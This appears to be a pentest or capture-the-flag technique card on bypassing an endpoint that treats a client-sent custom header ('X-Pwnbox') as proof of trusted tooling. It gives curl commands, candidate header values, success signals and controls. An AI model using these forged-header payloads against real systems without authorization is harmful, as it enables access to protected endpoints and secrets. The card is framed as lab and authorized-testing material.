# Custom Header Handshake Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when an endpoint shows messages like:

```text
Handshake not detected.
Internal tooling only.
```

and may return a constant custom response header such as:

```http
x-pwnbox: null
```

## Requirements

- You can send arbitrary HTTP request headers.
- The denied and accepted states are visible in the response body or content.
- You have confirmed the response header is not a reliable pass/fail oracle.

## Minimal Test

```bash
curl -sS "https://[host]/"
curl -sS -H "X-Pwnbox: handshake" "https://[host]/"
```

## Payload Shape

Any non-empty branded header value may work:

```http
X-Pwnbox: handshake
X-Pwnbox: tooling
X-Pwnbox: internal
X-Pwnbox: echo
```

## Expected Signals

Denied:

```text
Handshake not detected.
```

Accepted:

```text
Handshake accepted.
```

Secret may appear in:

```html
<pre>...</pre>
```

## Controls

These should remain denied:

```http
(no custom header)

X-Pwnbox:

Pwnbox: handshake
```

## Why It Works

The server treats header presence as proof of trusted tooling. The client fully controls request headers, so the gate is forgeable.

## Why It Fails

- The server requires a signed token or session cookie.
- The header name or value must match a secret not yet discovered.
- The endpoint is actually protected by network controls outside HTTP header reach.
- You are judging success from a response header that never changes.

## Common Mistakes

- Trusting `x-pwnbox: null` or similar constant response headers.
- Assuming a real WebSocket/TLS handshake is required without testing simple `X-*` headers.
- Testing only browser navigation and not raw header replay with `curl`.
- Stopping after empty-header failure without trying wrong header names as a control.

## Defensive Note

Do not store live flags, tokens, or private URLs in reusable payload files.
